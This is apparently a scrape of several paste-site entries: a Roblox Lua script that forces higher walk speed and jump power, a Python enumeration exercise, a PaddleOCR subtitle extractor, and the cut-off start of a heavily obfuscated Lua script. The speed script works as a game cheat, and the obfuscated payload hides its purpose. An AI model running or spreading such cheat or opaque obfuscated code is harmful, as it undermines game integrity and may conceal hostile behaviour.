    	.byte 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
    	.byte 0,0,255,0,0,255,0,0,195,0,0,195,0,0,195,0
    	.byte 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
"
8efhz7GC,Tutorial,MrGluckingBall,Lua,Sunday 19th of October 2025 07:51:26 AM CDT,"--[[// Tutorial

Script by MrGluckingBall/Joe/R_MP6,
enjoy!

]]

local player = game.Players.LocalPlayer
local userInputService = game:GetService(""UserInputService"")
local RunService = game:GetService(""RunService"")

-- === Toggle These ===
speed = true
jump = true
-- ====================

local isUsingSetA = true

-- Animation Sets
local animSetA = {
	idle = ""rbxassetid://0"",
	walk = ""rbxassetid://0""
}

local animSetB = {
	idle = ""rbxassetid://0"", -- Change this
	walk = ""rbxassetid://0"" -- And this.
}

local currentSet = animSetA
local walkTrack, idleTrack
local runningConnection
local speedEnforcer
local jumpEnforcer

-- Apply animations and speed/jump if enabled
local function applyAnimations(character)
	local humanoid = character:WaitForChild(""Humanoid"")

	-- Reset old
	if walkTrack then walkTrack:Stop() end
	if idleTrack then idleTrack:Stop() end
	if runningConnection then runningConnection:Disconnect() end
	if speedEnforcer then speedEnforcer:Disconnect() end
	if jumpEnforcer then jumpEnforcer:Disconnect() end

	-- Enforce WalkSpeed
	if speed then
		humanoid.WalkSpeed = 34
		speedEnforcer = humanoid:GetPropertyChangedSignal(""WalkSpeed""):Connect(function()
			if humanoid.WalkSpeed ~= 34 then
				humanoid.WalkSpeed = 34
			end
		end)
	end

	-- Enforce JumpPower + JumpHeight
	if jump then
		humanoid.UseJumpPower = true
		humanoid.JumpPower = 75
		humanoid.JumpHeight = 7.2

		jumpEnforcer = RunService.Heartbeat:Connect(function()
			if humanoid and humanoid.Parent then
				if not humanoid.UseJumpPower then
					humanoid.UseJumpPower = true
				end
				if humanoid.JumpPower ~= 75 then
					humanoid.JumpPower = 75
				end
				if humanoid.JumpHeight ~= 7.2 then
					humanoid.JumpHeight = 7.2
				end
			end
		end)
	end

	-- Load animations
	local walkAnim = Instance.new(""Animation"")
	walkAnim.AnimationId = currentSet.walk
	walkTrack = humanoid:LoadAnimation(walkAnim)
	walkTrack.Looped = true

	local idleAnim = Instance.new(""Animation"")
	idleAnim.AnimationId = currentSet.idle
	idleTrack = humanoid:LoadAnimation(idleAnim)
	idleTrack.Looped = true

	runningConnection = humanoid.Running:Connect(function(speedVal)
		if speedVal > 0 then
			idleTrack:Stop()
			if not walkTrack.IsPlaying then walkTrack:Play() end
		else
			walkTrack:Stop()
			if not idleTrack.IsPlaying then idleTrack:Play() end
		end
	end)

	idleTrack:Play()
end

-- Tap toggle support
local lastTapTime = 0
local tapThreshold = 0.5
local function handleTouch(input)
	local tapped = input.Position
	local currentTime = tick()
	if currentTime - lastTapTime > tapThreshold then
		lastTapTime = currentTime
		local bufferArea = Rect.new(50, 50, 150, 150)
		if bufferArea:Contains(tapped) then
			isUsingSetA = not isUsingSetA
			currentSet = isUsingSetA and animSetA or animSetB
			if player.Character then
				applyAnimations(player.Character)
			end
		end
	end
end

-- GUI init
local function initializeGUI()
	if not player.PlayerGui:FindFirstChild(""AnimToggleGui"") then
		local screenGui = Instance.new(""ScreenGui"")
		screenGui.Name = ""AnimToggleGui""
		screenGui.ResetOnSpawn = false
		screenGui.IgnoreGuiInset = true
		screenGui.Parent = player:WaitForChild(""PlayerGui"")

		local button = Instance.new(""TextButton"")
		button.Size = UDim2.new(0, 120, 0, 40)
		button.Position = UDim2.new(1, -130, 0.5, -20) -- original position
		button.Text = ""TOGGLE ANIM""
		button.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
		button.TextColor3 = Color3.fromRGB(255, 230, 180)
		button.Font = Enum.Font.GothamBold
		button.TextSize = 16
		button.AutoButtonColor = false
		button.Parent = screenGui

		local uicorner = Instance.new(""UICorner"")
		uicorner.CornerRadius = UDim.new(0, 4)
		uicorner.Parent = button

		local stroke = Instance.new(""UIStroke"")
		stroke.Color = Color3.fromRGB(120, 100, 60)
		stroke.Thickness = 1.8
		stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
		stroke.Parent = button

		local shadow = Instance.new(""TextLabel"")
		shadow.Size = button.Size
		shadow.Position = UDim2.new(0, 1, 0, 1)
		shadow.BackgroundTransparency = 1
		shadow.Text = button.Text
		shadow.TextColor3 = Color3.fromRGB(0, 0, 0)
		shadow.Font = button.Font
		shadow.TextSize = button.TextSize
		shadow.ZIndex = button.ZIndex - 1
		shadow.Parent = button

		button.MouseEnter:Connect(function()
			button.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
		end)

		button.MouseLeave:Connect(function()
			button.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
		end)

		button.MouseButton1Click:Connect(function()
			isUsingSetA = not isUsingSetA
			currentSet = isUsingSetA and animSetA or animSetB
			if player.Character then
				applyAnimations(player.Character)
			end
		end)

		userInputService.TouchStarted:Connect(handleTouch)
	end
end

-- Main
initializeGUI()
if player.Character then
	applyAnimations(player.Character)
end

player.CharacterAdded:Connect(function(character)
	currentSet = isUsingSetA and animSetA or animSetB
	applyAnimations(character)
end)"
4zSHvp1r,8,nq1s788,Python,Sunday 19th of October 2025 07:48:19 AM CDT,"#https://inf-ege.sdamgia.ru/problem?id=59686
alph = 'АГМНСТУ'
ind = 0
for q in alph:
    for w in alph:
        for e in alph:
            for r in alph:
                for t in alph:
                    for y in alph:
                        ind += 1
                        s = q + w + e + r + t + y
                        if s[0] != 'У' and s.count('М') == 2 and s.count('Г') <= 1:
                            print(ind)"
NhRqzMuZ,ocr.py,sbbjun,Python,Sunday 19th of October 2025 05:06:46 AM CDT,"# 下載VideoSubFinder, 改path_VideoSubFinder
# 裝CUDA 12.9
# pip install paddlepaddle-gpu -i https://www.paddlepaddle.org.cn/packages/nightly/cu129/
# pip install paddleocr

import os
import glob
import subprocess
import time
import argparse
import numpy as np
from PIL import Image
from paddleocr import PaddleOCR

path_VideoSubFinder = r""D:\work\workspace\SubtitleOCR\VideoSubFinder""
fn_VideoSubFinder = ""VideoSubFinderWXW_intel.exe""
path_VideoSubFinder_exe = fr""{path_VideoSubFinder}\{fn_VideoSubFinder}""
path_sub_images = fr""{path_VideoSubFinder}\RGBImages""

parser = argparse.ArgumentParser()
parser.add_argument('-i', '--image', required=False, help='image file path')
parser.add_argument('-v', '--video', required=False, help='video file path')
parser.add_argument('-te', '--sub_top', type=float, default=0.15, help='top of subtitle, percent offset of height, from bottom. (default=0.15)')
parser.add_argument('-be', '--sub_bottom', type=float, default=0.05, help='bottom of subtitle, percent offset of height, from bottom. (default=0.05)')
parser.add_argument('-mw', '--ocr_min_width', type=int, default=100, help='ocr: minimum text width. (default=100)')
parser.add_argument('-mh', '--ocr_min_height', type=int, default=50, help='ocr: minimum text height. (default=50)')
args = parser.parse_args()

print(""Initializing PaddleOCR..."")
ocr = PaddleOCR(
    text_detection_model_name=""PP-OCRv5_server_det"",
    text_recognition_model_name=""PP-OCRv5_server_rec"",
    use_doc_orientation_classify=False,
    use_doc_unwarping=False,
    use_textline_orientation=False,
)

def do_ocr(img_path):
    try:
        img = np.array(Image.open(img_path).convert('RGB'))
    except Exception as e:
        print(f""[ERROR] Failed to open image {img_path}: {e}"")
        return """"

    result = ocr.predict(img)
    for res in result:
        if 'rec_texts' not in res or 'rec_polys' not in res:
            continue
        txts, polys = res['rec_texts'], res['rec_polys']
        kept_txts = []
        for txt, poly in zip(txts, polys):
            xs = [p[0] for p in poly]
            ys = [p[1] for p in poly]
            width, height = max(xs) - min(xs), max(ys) - min(ys)
            if height >= args.ocr_min_height and width >= args.ocr_min_width:
                kept_txts.append(txt)
        if kept_txts:
            return "" "".join(kept_txts)
    return """"

# If only an image is provided, do single OCR and exit
if args.image and not args.video:
    print(f""Performing OCR on image: {args.image}"")
    txt = do_ocr(args.image)
    print(txt)
    print(""Single image OCR complete."")
    exit(0)

if not args.video:
    print(""[ERROR] Missing required argument: -v/--video when not using -i/--image only."")
    exit(1)

# Step 1: Run VideoSubFinder
print(""Step 1: Running VideoSubFinder..."")
params = [path_VideoSubFinder_exe, '-uc', '-c', '-r', '-i', args.image or args.video, '-te', str(args.sub_top), '-be', str(args.sub_bottom)]
proc = subprocess.Popen(params)

print(""Waiting for VideoSubFinder to complete..."")
flag_first = True
path_sub_images_jpeg = os.path.join(path_sub_images, '*.jpeg')
while proc.poll() is None:
    time.sleep(3)
    jpegs = glob.glob(path_sub_images_jpeg)
    if jpegs:
        print(jpegs[-1], flush=True)
        if flag_first:
            os.startfile(jpegs[0])
            flag_first = False
print(""VideoSubFinder finished."")


# Step 2: Get subtitle image files
print(""Step 2: Collecting subtitle images..."")
imgs = sorted(glob.glob(os.path.join(path_sub_images, '*.jpeg')))
print(f""Found {len(imgs)} subtitle images."")

# Step 3: OCR each subtitle image and generate VTT
print(""Step 3: Performing OCR and writing .vtt file..."")
output_vtt = f""{args.video}.vtt""
with open(output_vtt, 'w', encoding='utf-8') as f:
    f.write(""WEBVTT\n\n"")
    for img in imgs:
        base = os.path.basename(img)
        parts = base.split('__')
        if len(parts) < 2:
            continue
        start, end = parts[0], parts[1].split('_000000')[0]
        start = start.replace('_', ':', 2).replace('_', '.')
        end = end.replace('_', ':', 2).replace('_', '.')
        txt = do_ocr(img)
        if not txt:
            continue
        print(f""[{time.strftime('%H%M%S')}] {start} --> {end}: {txt}"")
        f.write(f""{start} --> {end}\n{txt}\n\n"")

print(f""Subtitle extraction complete: {output_vtt}"")
"
pBj1CjcE,Gunung Meledak,yocky12k,Lua,Sunday 19th of October 2025 04:39:28 AM CDT,"--[[ v1.0.0 https://wearedevs.net/obfuscator ]] return(function(...)local P={""\054\116\099\078"",""\083\099\061\061"",""\081\103\107\112\051\103\067\061"",""\120\108\072\056\081\065\077\048\084\119\072\098\079\080\069\072\049\089\122\104\090\107\104\061"";""\084\074\053\048\072\099\061\061"";""\101\083\098\106\053\078\053\109\081\043\107\066\099\080\112\109\051\103\101\116\053\056\107\070\088\118\107\069"";""\047\066\066\119\086\083\086\069\047\114\101\086\081\073\071\056\110\067\061\061"",""\103\067\120\122\100\098\067\061"",""\079\065\110\105\066\113\119\055\122\116\066\083\052\069\098\110\083\116\043\101\057\065\053\112\047\088\075\082\051\049\068\110\080\118\068\082\072\078\087\085\079\081\082\076\072\066\047\104\050\068\100\098\067\052\099\075\085\110\084\080\076\069\074\065"",""\108\085\065\108\085\104\069\090\079\056\107\085\071\115\104\061"",""\090\118\098\097\078\071\081\061"",""\051\066\117\086\052\066\115\118\107\121\104\076\049\073\101\116\052\108\061\061"";""\089\067\054\114\099\121\047\068\065\052\102\043\073\115\106\110\121\089\050\117\069\100\077\086\115\088\078\083\043\122\081\061"",""\052\118\071\112\052\118\117\069"",""\081\102\080\121\120\108\061\061"";""\108\118\052\048\105\068\067\118\102\077\055\087\097\078\115\049\076\075\115\108\054\073\098\088\077\100\075\077\097\110\076\049\090\081\110\051\053\110\111\102\080\050\099\061"";""\068\118\100\080\118\086\069\047\079\110\113\052\119\110\069\071\090\068\111\086\115\108\061\061"";""\079\080\085\083\107\083\077\043\110\111\120\117\043\086\099\103\100\066\105\087\108\052\089\121"",""\105\049\114\061"";""\074\106\122\102\047\067\061\061"";""\099\082\102\087"";""\056\090\090\052\115\076\056\099\085\099\102\061"";""\053\119\107\120\088\102\061\061"",""\053\074\116\077\113\111\120\050\104\108\061\061"",""\098\070\070\113\073\101\048\061"",""\099\080\090\106\051\083\086\097\089\108\061\061"",""\103\072\100\112"";""\099\119\117\098\088\118\101\098\086\103\121\057"";""\065\120\055\098\087\057\086\066\089\086\066\061"",""\110\083\098\069\053\098\121\074\051\098\053\078\088\098\086\097"",""\106\071\052\106\066\088\098\098\071\075\049\047\103\048\102\103\113\085\070\054\050\086\071\103\067\068\078\061"";""\057\082\073\122\083\114\118\113\056\069\098\087\113\048\118\121\051\051\051\108\110\077\087\061"";""\066\116\088\097\085\065\102\112\105\102\061\061"",""\066\085\085\100\112\067\061\061"";""\109\070\055\099\112\101\120\071\120\072\121\043"",""\057\054\108\043"",""\090\110\102\087\070\083\053\082\049\085\088\061"",""\089\103\090\069\089\105\117\109\051\083\081\061"",""\110\043\112\116\077\086\081\076\101\056\121\088\107\114\112\111\114\118\104\061"",""\109\077\103\120\075\075\112\102\049\078\088\061"";""\089\072\070\080\107\099\061\061"";""\071\077\050\070\078\108\061\061"";""\109\119\073\065\109\053\081\116\103\108\056\050"";""\052\105\074\075\120\076\083\099\086\057\078\085\087\102\115\100\111\067\088\061"";""\085\077\082\069\089\103\121\106\088\080\114\061"";""\077\083\101\067\089\098\109\070\088\069\088\100\049\105\089\057"",""\089\105\098\067\053\099\061\061"";""\102\110\104\051\112\067\114\065\117\075\084\071\050\108\056\061"",""\079\043\090\068\107\100\067\119\088\099\061\061"";""\103\101\077\086\100\073\079\083\084\053\107\077\053\098\110\107\070\052\057\108\076\108\061\061"",""\081\049\101\073\069\050\088\061"",""\054\067\073\080"",""\088\108\061\061"";""\108\115\049\057\121\051\117\099\055\090\070\069\051\104\084\111\066\108\061\061"",""\118\100\086\116\122\100\079\069\114\087\065\101\072\117\056\056\084\106\083\054"";""\051\111\107\100\073\108\061\061"",""\122\088\089\110\079\104\102\061"";""\086\056\114\120\086\078\115\119\049\056\082\056\086\077\112\068\107\102\061\061"";""\081\083\086\115\051\119\053\098"";""\054\114\089\120\081\086\107\116\052\097\071\068\077\103\107\116\051\105\078\061"",""\050\055\113\117\121\070\119\087\090\079\047\061"";""\113\118\074\086\043\065\072\107"",""\054\102\061\061"";""\052\056\109\083\085\043\053\105\110\098\078\120\053\103\112\076\099\077\047\061"",""\098\120\087\065\122\090\056\107"",""\114\054\083\103\073\079\051\121\100\099\088\085\081\049\066\061"",""\119\078\084\051\112\103\100\109\057\078\081\109"",""\101\048\080\066\075\051\117\116\055\102\061\061"",""\085\065\084\057\077\109\104\061"";""\117\104\099\112\116\103\110\105\057\106\117\113\097\113\122\104\097\050\100\081\082\043\073\043\077\056\067\068\090\052\056\047"";""\053\075\100\107\119\080\047\117\119\112\090\100\052\113\056\065\119\076\054\089\112\081\103\118\055\085\110\116\082\067\061\061"",""\122\097\053\080"",""\085\105\084\102\087\104\100\111\097\110\073\066\081\053\048\073\055\117\113\055\078\112\081\061"",""\098\104\087\118\043\108\061\061"";""\111\083\074\103\079\099\052\074\077\119\070\061"",""\049\121\081\100\101\110\121\069\051\119\086\053\077\103\068\120"";""\073\085\111\054\081\079\070\061"";""\081\079\107\077\088\077\117\090\071\107\073\071\066\067\061\061"";""\043\115\054\099\082\105\121\098\049\102\056\080\085\121\090\116"",""\068\056\121\074\050\088\106\051"";""\118\112\075\098"",""\053\043\098\078\089\083\082\076\049\078\112\052\089\103\115\075\114\097\102\061"",""\082\105\070\099\077\102\061\061"",""\100\115\067\111\051\103\076\098"",""\115\067\047\110\105\110\074\117"";""\097\097\111\085\111\069\055\115\052\110\043\078"";""\071\072\111\089\117\108\061\061"";""\108\104\052\069\101\111\110\053\103\097\108\061"",""\070\050\049\066\048\080\117\084\076\102\061\061"";""\048\050\105\111\082\054\100\047\056\065\047\061"",""\086\083\086\097\089\103\090\076\047\067\061\061"",""\112\109\078\065\056\080\105\122\085\113\100\082\102\050\076\117\103\086\105\120\043\086\082\118\068\102\102\061"",""\072\084\054\049\085\072\056\087\076\121\078\061"";""\097\067\107\116\107\097\100\101\056\120\104\083\075\088\114\061"",""\114\103\071\122\085\116\048\121\088\099\061\061"";""\043\087\086\113\112\079\087\054\085\067\061\061"",""\111\097\075\101\099\102\065\116\051\057\116\052\071\067\089\078\075\047\050\053\112\067\061\061"";""\050\104\101\047\055\113\066\066\056\122\110\105\078\122\070\061"";""\098\118\087\067"",""\085\098\107\116\110\056\101\098\088\080\090\056\053\099\061\061"",""\077\114\107\120\114\103\120\099\086\043\053\119\081\077\112\056\088\086\056\061"";""\053\118\117\076\051\119\087\061"",""\107\068\075\099\084\089\116\083\073\116\105\079\089\108\061\061"";""\067\111\111\116\075\073\090\083\067\110\108\066\078\056\117\086\103\047\073\104\081\099\061\061"";""\047\087\057\069\082\047\068\118\101\074\116\057\087\108\061\061"",""\077\105\050\106\097\065\057\070\056\076\081\061"";""\052\121\054\066\068\102\048\111\051\099\061\061"";""\097\048\074\057\116\088\076\051\055\100\104\071\050\071\081\076\071\107\106\108\105\070\070\104\052\053\108\061"";""\051\077\121\066\052\108\061\061"";""\052\104\112\104\116\098\048\053\117\102\061\061"";""\053\075\075\051\074\122\113\048\111\055\047\061"";""\097\117\121\111\047\057\052\074\075\088\102\083\055\080\073\085"",""\050\066\112\087\054\102\061\061"",""\083\087\083\120\074\105\087\084\099\082\080\074\103\102\061\061"";""\099\119\117\098\088\118\101\098\086\103\090\043\053\080\100\098"",""\086\080\121\109\089\078\053\074\081\056\107\104\052\077\100\056"";""\100\114\102\050\087\088\066\061"";""\050\068\071\052\110\112\070\073\080\086\055\073\086\068\110\106\080\090\078\090\082\065\104\121\118\053\067\043\072\114\048\066\088\122\078\115\076\104\065\076\117\074\081\102\116\122\065\099\118\087\122\066\089\107\119\048\100\075\110\119\081\047\051\043\100\065\048\084\087\120\074\057\069\088\097\069\065\119\080\077"";""\089\056\090\067\081\083\082\112\088\098\053\117\053\043\071\054\085\086\114\061"",""\076\052\054\121\085\068\122\121\115\102\061\061"",""\066\089\071\049\116\043\108\069\070\077\087\061"",""\116\102\061\061"";""\081\074\079\070\075\118\090\103\102\051\087\084\048\088\111\078\109\117\066\085\102\108\061\061"";""\114\066\098\106\085\098\053\078\085\086\117\077\047\069\087\119\086\118\056\061"",""\083\076\105\054\089\089\048\061"",""\048\101\104\115\066\108\061\061"",""\082\102\057\111\051\114\068\066\076\051\085\097"",""\087\054\067\077\089\065\072\071\106\100\066\061"";""\048\108\112\071\109\108\061\061"",""\120\087\052\068\105\067\061\061"";""\088\086\107\110\086\051\121\073\043\067\061\061"";""\107\078\121\071\085\083\098\070\051\119\108\069\052\119\101\053\077\099\061\061"";""\118\120\090\115\053\118\101\112\089\103\121\057\051\103\114\061"",""\057\056\068\103\112\119\118\120\083\090\118\116\084\050\075\121"",""\114\080\086\066"",""\051\066\107\119\121\081\053\118\100\120\102\097\089\075\109\077\097\102\061\061"",""\089\113\113\121\098\074\108\061"",""\085\080\090\052\085\078\101\074\054\114\098\106\077\105\109\107\101\102\061\061"",""\107\075\122\119\110\079\085\054\104\097\067\089\087\107\098\107\079\071\116\065\075\087\105\108\119\115\113\104\117\067\097\053\104\052\098\086\111\102\061\061"",""\116\070\104\068\078\076\073\055\102\066\052\083\077\052\081\053\103\043\054\103\109\068\084\101\119\076\047\061"",""\054\055\102\081"";""\119\089\075\074\090\102\061\061"";""\102\118\088\078\119\079\121\077\048\075\121\105\119\047\081\112\084\109\086\052\103\101\051\081\054\105\106\066\090\082\087\074\120\080\116\078\080\088\084\103\089\088\112\048"";""\113\072\109\112\067\071\089\049\075\099\061\061"",""\048\080\107\120\070\120\114\106\086\052\112\048\080\085\104\120\070\116\109\117\074\099\061\061"",""\120\114\048\065\066\084\074\051\050\075\114\061"";""\090\102\088\067"";""\081\119\101\076\052\077\082\043"";""\082\106\074\048\074\119\116\121\065\120\114\106\116\076\089\054\054\067\061\061"";""\047\077\117\075\049\043\053\072\101\056\104\076\101\103\089\101\088\102\061\061"",""\122\076\083\109\100\043\079\083\118\106\071\119"",""\054\114\098\073\077\078\115\110\085\105\107\076\114\043\121\068\081\103\081\061"",""\065\077\050\098\084\102\061\061"";""\118\120\090\109\051\083\101\098\049\108\061\061"";""\111\111\072\089\043\104\077\119\080\071\106\049"",""\089\055\053\103\119\115\101\057\048\103\115\069\073\116\119\113\106\075\103\103\066\075\054\097\079\070\120\050\118\073\067\112\088\082\081\089\081\076\048\088\110\048\118\113\077\121\065\107\110\048\080\073\052\075\074\087\047\118\119\068\072\043\078\055\078\085\114\067\055\081\056\106\115\117\115\048\117\097\067\052\100\105\047\073\050\121\109\083\052\053\071\121\067\076\073\106\113\110\104\061"";""\099\071\047\049\112\121\099\061"";""\088\079\049\066\065\067\061\061"";""\076\067\097\085\100\106\102\073\047\104\053\084\112\114\071\057\086\089\084\111\049\122\075\055\102\099\099\049\120\050\089\085\057\087\114\121\115\099\061\061"",""\115\083\073\067\089\115\083\097\090\108\073\083\081\055\065\121\090\077\076\079\105\102\061\061"",""\106\112\099\056\066\047\048\110\099\072\078\086\115\073\075\067\108\082\048\061"",""\073\083\068\110\050\069\065\089\097\081\080\119\101\070\055\088\108\057\121\084\053\049\118\109"",""\099\119\117\098\088\118\101\098\086\080\098\106\053\103\090\119"";""\088\056\082\074\088\043\098\111\086\043\112\066\101\103\053\071"",""\083\080\079\083\115\108\061\061"",""\070\054\050\070\104\088\115\079\102\067\043\080\056\108\089\083\111\052\077\085\071\108\114\116\113\120\117\089\051\087\056\090\085\088\082\075\070\086\070\061"",""\053\080\121\115\053\099\061\061"";""\108\057\116\113\100\097\043\067\101\122\087\079\056\099\061\061"";""\074\078\081\102\108\085\049\112"",""\106\097\047\118\069\098\089\111\113\102\061\061"";""\081\101\056\049\081\099\061\061"",""\112\069\047\068\079\098\047\061"",""\103\065\109\052\065\108\061\061"",""\054\057\102\098\053\122\104\109\054\102\061\061"";""\085\105\048\068\055\047\075\120\083\047\118\068\086\102\061\061"";""\101\083\098\106\053\078\053\109\081\043\107\066\099\080\112\109\051\103\099\061"";""\120\107\116\087"";""\075\043\118\120\111\097\043\107\097\113\108\061"";""\056\075\122\086\098\108\066\105\085\112\070\085\051\113\122\116\106\102\043\082\120\101\105\110\070\099\061\061"";""\066\112\098\077\113\098\108\061"",""\120\079\108\101\071\100\104\082\081\110\120\089\073\067\061\061"";""\073\056\054\057\053\067\061\061"";""\116\086\121\083\084\065\089\047\068\073\087\061"";""\051\103\090\112\053\105\107\066\081\083\098\106\053\067\061\061"",""\116\110\066\115\056\047\083\068\101\108\061\061"";""\065\068\100\117\081\122\099\061"";""\085\121\109\111\088\098\071\101\086\077\112\083\052\066\104\080\085\102\061\061"",""\054\105\071\072\101\073\117\097\110\097\107\057\051\114\112\101\051\067\061\061"";""\056\056\099\077"";""\080\105\071\106\106\102\061\061"";""\068\120\085\108\053\115\116\077\079\104\074\087\053\106\101\103\103\084\084\072\075\055\102\050"";""\117\051\108\112\066\099\061\061"";""\083\118\056\120\067\051\067\050\113\056\085\049\099\068\114\107"";""\114\081\105\103\111\068\100\074\075\120\054\083\083\120\099\079\050\048\104\090\055\081\100\118\043\086\088\061"";""\111\057\082\102\081\108\065\102\075\106\087\061"",""\054\120\055\085\065\080\099\101\118\107\101\081\088\102\061\061"",""\105\055\074\118\057\070\056\107\068\056\088\061"";""\084\120\075\068\054\104\047\068\119\116\107\107\055\047\106\117\099\077\079\100\048\082\070\116\080\116\079\117\110\122\109\090\043\108\050\085\107\108\061\061"";""\119\074\076\112"";""\114\057\085\074"",""\086\080\121\109\089\108\061\061"";""\114\075\107\113"",""\068\121\114\069"";""\118\120\078\118\112\078\079\104\115\105\054\057\105\108\083\071\072\089\077\065\051\050\048\061"";""\043\098\047\114"";""\054\110\098\120\047\077\107\086\101\080\112\100\086\097\121\098\107\099\061\061"",""\104\084\081\077\074\070\102\061"";""\051\073\087\061"",""\075\103\072\117"";""\097\122\104\047\116\069\099\116\049\089\066\082\053\072\087\110\057\119\122\049"",""\077\120\076\073\113\090\113\083\090\067\061\061"";""\051\112\097\047\043\099\061\061"";""\119\107\112\068\052\102\061\061"",""\115\097\105\104"",""\113\070\113\108"";""\107\105\107\067\052\083\056\069\077\083\098\075\054\086\101\109"";""\083\089\072\089\085\054\056\061"",""\119\114\056\071"",""\110\055\112\118\118\102\061\061"",""\111\057\100\121\117\090\087\061"";""\074\056\083\069\086\067\061\061"";""\047\069\086\087\088\066\090\087\088\114\117\120\047\043\101\106\049\097\081\061"";""\120\048\056\049"";""\051\103\086\106"",""\069\100\074\122\087\050\114\056\087\086\109\078\049\056\069\085\078\069\053\074\048\112\047\100\116\120\083\112\114\050\051\106\090\122\090\102\082\107\075\070\121\106\055\085\053\078\116\114\106\105\072\057\085\052\087\047\067\090\097\082\099\086\116\108\073\101\116\113\056\082\121\069\089\069\112\111\050\066\072\069\081\090\113\073\121\102\061\061"";""\054\109\087\089\098\102\061\061"",""\050\065\121\104\106\108\104\061"",""\118\120\090\043\088\067\061\061"",""\099\119\117\098\088\118\101\098\114\103\121\076\088\077\089\076\088\118\071\104"",""\086\078\107\065\100\067\117\084\089\052\047\049\078\122\073\075\047\104\101\080\115\115\121\071\110\099\061\061"",""\078\113\072\043\056\100\085\105\070\102\061\061"";""\110\097\048\100\118\055\075\054\118\110\105\114\119\050\057\081\117\111\102\090\089\050\049\057\074\089\077\068\114\067\061\061"";""\043\109\048\078\098\101\121\100\105\121\065\102\088\109\084\098\080\085\117\048\114\049\105\084\113\053\113\119\050\106\087\061"",""\101\085\074\099\110\117\114\076\088\085\105\105\119\053\074\113\043\109\119\111\069\052\047\061"",""\113\080\090\108\101\072\110\067\050\110\120\104"";""\097\098\056\102"",""\089\103\053\066\082\067\061\061"";""\088\107\111\101\085\115\110\087\086\057\048\101"",""\111\054\065\056\052\057\100\113\049\113\098\065"";""\101\057\068\057\108\113\112\047"";""\115\117\082\049"";""\053\108\061\061"",""\108\116\072\104\049\067\061\061"",""\084\051\055\112\086\057\049\113\108\051\070\061"";""\122\049\122\080\104\086\108\108"";""\088\105\085\054\055\118\047\089\066\077\052\090\103\099\061\061"",""\101\080\086\066\099\080\112\109\051\103\101\076\053\077\068\061"",""\074\055\066\071\101\099\061\061"",""\056\074\085\115\071\067\099\112\053\100\055\080\047\106\089\082\120\113\070\121\047\049\116\079\103\104\082\082\107\097\101\103"",""\087\099\065\084"";""\072\086\087\085\101\079\067\061"",""\107\120\117\103\047\078\082\104\086\066\115\075\051\121\081\069\086\043\087\061"";""\086\097\053\071\085\056\112\118\089\120\071\100\052\083\053\074"";""\076\084\077\079\085\108\061\061"",""\081\056\115\116\053\077\102\068\086\056\090\077\051\114\107\116\085\067\061\061"",""\110\056\043\051\067\083\114\061"",""\089\103\098\097\052\067\061\061"",""\051\069\099\120\101\105\089\115\086\080\121\084\107\086\102\061"",""\114\043\121\115\052\105\088\100\047\097\107\066\081\114\112\100\114\080\047\061"";""\106\119\077\110"";""\118\065\075\088\043\051\047\079\107\111\056\061"";""\081\083\121\106\053\103\090\115"",""\079\085\085\099"",""\084\085\117\050\075\108\061\061"",""\086\075\079\088\079\107\056\073\098\090\103\116\117\053\106\075\084\099\061\061"";""\097\106\072\107\105\110\079\098\071\066\049\118\097\102\055\043"",""\086\103\121\115\081\103\086\076\087\078\101\098\089\103\086\097\089\103\086\056\087\099\061\061"";""\079\054\082\102\055\104\121\076\120\084\076\122\119\112\098\084\111\100\099\061"";""\048\075\105\049\109\067\061\061"",""\099\111\075\076\105\053\066\061"",""\066\088\116\085\066\102\061\061"",""\116\069\099\115\043\099\061\061"";""\104\079\116\070\057\103\049\109\109\090\105\089\070\089\072\074"";""\067\072\043\077\054\117\081\050\081\073\081\061"";""\099\105\110\110\078\102\061\061"";""\069\055\082\069\090\077\107\085\101\109\104\043"",""\111\097\086\057\086\067\073\089\079\113\052\049\069\103\101\114"";""\049\114\112\099\051\078\120\106\047\077\107\117\089\066\090\086"",""\056\052\121\043"",""\077\121\117\076"";""\053\052\089\057\120\111\120\100\107\099\061\061"";""\100\079\115\120\079\077\113\071\088\103\048\051"";""\049\098\090\076\103\085\112\085\075\073\099\112\108\116\072\053\083\050\079\069\083\099\071\097"";""\110\082\070\076"";""\047\105\108\057\078\049\108\097\089\053\066\061"";""\087\121\053\116"";""\054\086\054\065\050\075\087\080"";""\106\081\082\078\054\090\114\061"";""\100\101\083\074"",""\054\073\069\052\087\056\099\106\053\109\053\056\116\088\113\051\048\109\102\061"",""\082\099\080\077\122\121\110\080\111\099\061\061"";""\070\067\049\105\103\077\103\118"";""\111\048\116\115\082\067\061\061"";""\053\049\069\118\122\099\061\061"";""\099\080\112\112\051\083\089\098\114\119\101\112\089\103\114\061"",""\051\101\075\072\071\102\061\061"";""\086\055\121\120\122\113\081\061"",""\085\082\048\121\109\043\102\070"";""\048\100\116\050\071\069\071\078\072\079\074\114"",""\086\083\117\043\049\086\121\109\110\069\121\052\049\056\101\070\107\102\061\061"",""\106\112\056\056\109\073\114\083\055\104\113\050\078\085\066\061"";""\088\115\051\099\121\050\075\104\070\065\115\117\110\067\061\061"",""\089\103\090\106\089\077\120\057\053\118\087\061"",""\099\101\097\109\065\102\061\061"";""\057\043\082\098\101\050\088\047\069\109\104\061"",""\100\067\077\083\083\103\070\061"";""\111\055\069\083\049\108\061\061"";""\102\085\089\086\067\074\119\118\122\102\061\061"";""\097\118\098\110"";""\085\084\057\074\103\121\112\118\066\067\061\061"",""\053\083\100\074\051\119\087\061"";""\052\103\109\115\052\121\086\078\051\118\081\119\101\077\109\106\086\102\061\061"";""\082\068\051\051\082\083\121\078\082\108\061\061"";""\050\109\085\066\117\048\085\105\118\088\066\068\054\108\061\061"",""\053\077\090\115\089\078\117\103\081\121\121\100\085\086\101\068\053\102\061\061"",""\097\076\068\101\084\055\065\054\120\120\082\111\109\067\061\061"",""\076\056\066\103\085\089\122\067\118\083\070\061"",""\065\069\108\121\057\113\108\061"";""\121\101\122\100\088\070\055\085\057\071\108\121\113\089\112\106"",""\102\080\068\112\108\102\061\061"",""\069\104\089\069\112\117\113\101\054\072\069\090\104\099\061\061"",""\110\073\101\111\051\069\101\054\101\103\089\098\047\114\053\117"";""\075\083\048\066\086\082\107\108\101\050\078\061"",""\088\080\112\112\081\102\061\061"";""\071\055\050\076"";""\066\120\055\122\080\104\068\061"",""\104\116\049\107""